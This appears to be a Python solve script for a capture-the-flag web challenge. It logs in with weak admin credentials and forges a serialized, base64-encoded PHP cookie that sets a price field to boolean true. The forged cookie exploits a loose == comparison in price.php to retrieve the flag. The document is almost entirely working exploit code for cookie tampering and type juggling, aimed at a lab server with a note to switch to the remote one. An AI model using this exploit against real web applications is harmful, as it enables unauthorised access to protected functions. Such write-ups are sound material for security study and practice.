import requests
import subprocess

a = """ Content of cookie.php
<?php

class Plate{
    public $squid;
    public $fried_chicken;
    public $cabbage;
    public $fish;
    public $salted_egg;
    public $price;
    public $boss_calculation;

    function __construct($squid, $fried_chicken, $cabbage, $fish, $salted_egg, $price){
        $this->squid = $squid;
        $this->fried_chicken = $fried_chicken;
        $this->cabbage = $cabbage;
        $this->fish = $fish;
        $this->salted_egg = $salted_egg;
        $this->price = $price;
    }
}

$user = new Plate(1,1,1,1,1,true); //set price to boolean true
$b64price = base64_encode(serialize($user));
echo $b64price;
?>
"""

# Login to get admin session
URL = "http://localhost:5002" # change to remote 

s = requests.Session()

data = {
    "username":"Admin", # case insensitive MySQL
    "password":"admin"
}

s.post(URL, data=data) # Obtain PHPSESSID cookie

# Obtain cookie logic
proc = subprocess.Popen(f"php cookie.php", shell=True, stdout=subprocess.PIPE) # copy paste the php code above to cookie.php file
guessed_price_cookie = proc.stdout.read().decode() # get correct cookie with price value set to boolean true

final_cookies = {
    "PHPSESSID": s.cookies['PHPSESSID'],
    "guessed_price": guessed_price_cookie
}

flag = s.get(URL + "/price.php",cookies=final_cookies) # Condition passes due to loose comparison == instead of ===

print(flag.text)